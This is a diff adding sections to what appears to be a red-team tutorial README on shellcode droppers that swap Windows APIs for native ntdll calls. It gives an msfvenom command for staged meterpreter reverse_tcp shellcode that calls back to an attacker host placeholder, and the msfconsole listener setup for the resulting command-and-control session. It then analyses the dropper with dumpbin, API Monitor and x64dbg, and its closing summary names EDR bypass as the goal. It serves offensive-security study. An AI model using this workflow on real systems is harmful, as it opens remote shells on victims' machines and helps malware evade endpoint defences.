@@ -112,5 +112,89 @@ int main() {
 
 }
 ```
-  
 
+
+## Meterpreter Shellcode
+In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
+create x64 staged meterpreter shellcode.
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
+```
+<p align="center">
+<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
+</p>
+
+The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
+<p align="center">
+<img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
+</p>
+
+
+## MSF-Listener
+Before we test the functionality of our high-level API dropper, we need to create a listener within msfconsole.
+
+**kali>**
+```
+msfconsole
+```
+**msf>**
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost IPv4_Redirector_or_IPv4_Kali
+set lport 80 
+set exitonsession false
+run
+```
+<p align="center">
+<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
+</p>
+
+Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 
+
+<p align="center">
+<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
+</p>
+
+
+
+## MLA-Dropper analysis: Dumpbin tool
+The Visual Studio Dumpbin tool can be used to check which Windows APIs are imported via Kernel32.dll. The following command can be used to check the imports.
+**cmd>**
+```
+cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
+dumpbin /imports high_level.exe
+```
+Compared to the high level dropper, you can observe that the medium level dropper no longer imports the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll.
+<p align="center">
+<img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
+</p>
+
+## MLA-Dropper analysis: API-Monitor
+Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions. We filter on the following API calls:
+- VirtualAlloc
+- NtAllocateVirtualMemory
+- WriteProcessMemory
+- NtWriteVirtualMemory
+- CreateThread
+- NtCreateThreadEx
+- WaitForSingleObject
+- NtWaitForSingleObject
+
+If everything was done correctly, you should no longer transitions from the Windows APIs to the native APIs we used in our medium-level Dropper POC.
+Instead we directly access the native APIs in ntdll.dll
+<p align="center">
+<img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
+</p>
+
+## HLA-Dropper analysis: x64dbg 
+Using x64dbg I check from which region of the PE structure of the High Level API dropper the system call for the Native API NtAllocateVirtualMemory is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of Ntdll.dll. This investigation is very important because later in the article I expect a different result with the low level POC and want to match it.
+![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)
+
+
+## Summary: Medium-level API Dropper
+- Made transition from high to medium level or from Windows APIs to Native APIs
+- But still no direct use of system calls
+- Syscall execution over medium_level_dropper.exe -> ntdll.dll -> syscall
+- Dropper imports no longer Windows APIs from kernel32.dll...
+- In case of EDR would only hook kernel32.dll -> EDR bypassed 
